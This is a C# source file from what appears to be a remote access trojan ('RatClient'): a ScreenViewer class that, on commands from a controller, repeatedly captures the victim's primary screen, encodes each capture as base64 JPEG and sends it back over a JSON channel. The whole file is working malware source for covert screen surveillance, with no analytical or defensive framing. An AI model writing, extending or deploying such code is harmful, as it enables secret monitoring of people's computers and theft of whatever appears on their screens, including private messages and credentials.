using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace RatClient.Features
{
    public class ScreenViewer
    {
        #region Variables
        private System.Timers.Timer screenshotTimer;
        private bool isSendingScreenshot = false;
        private int bufferSize;
        private Action<object> sendJson;
        #endregion

        #region Methods
        public ScreenViewer(int bufferSize, Action<object> sendJson)
        {
            this.bufferSize = bufferSize;
            this.sendJson = sendJson;
            
            Program.MessageReceived += HandleMessage;
        }

        private void HandleMessage(dynamic message)
        {
            switch (message["type"].ToString())
            {
                case "set_interval":
                    SetIntervalAndStartSendingScreenshots((int)message["interval"]);
                    break;
                case "stop_screenshots":
                    StopSendingScreenshots();
                    break;
            }
        }

        public void SetIntervalAndStartSendingScreenshots(int interval)
        {
            if (interval <= 0)
            {
                if (screenshotTimer != null)
                {
                    screenshotTimer.Stop();
                    screenshotTimer.Dispose();
                    screenshotTimer = null;
                }
                return;
            }
            screenshotTimer = new System.Timers.Timer(interval);
            screenshotTimer.Elapsed += (sender, e) => SendScreenshot();
            screenshotTimer.Start();
        }

        public void StopSendingScreenshots()
        {
            if (screenshotTimer != null)
            {
                screenshotTimer.Stop();
                screenshotTimer.Dispose();
                screenshotTimer = null;
                sendJson(new { type = "message", text = "Stopped sending screenshots." });
            }
        }

        private void SendScreenshot()
        {
            if (isSendingScreenshot)
                return;

            isSendingScreenshot = true;

            var screenshot = CaptureScreen();
            string base64Screenshot = Convert.ToBase64String(screenshot);
            sendJson(new { type = "screenshot", data = base64Screenshot });

            isSendingScreenshot = false;
        }

        private byte[] CaptureScreen()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(bitmap);
            graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                bitmap.Save(memoryStream, ImageFormat.Jpeg);
                return memoryStream.ToArray();
            }
        }
        #endregion
    }
}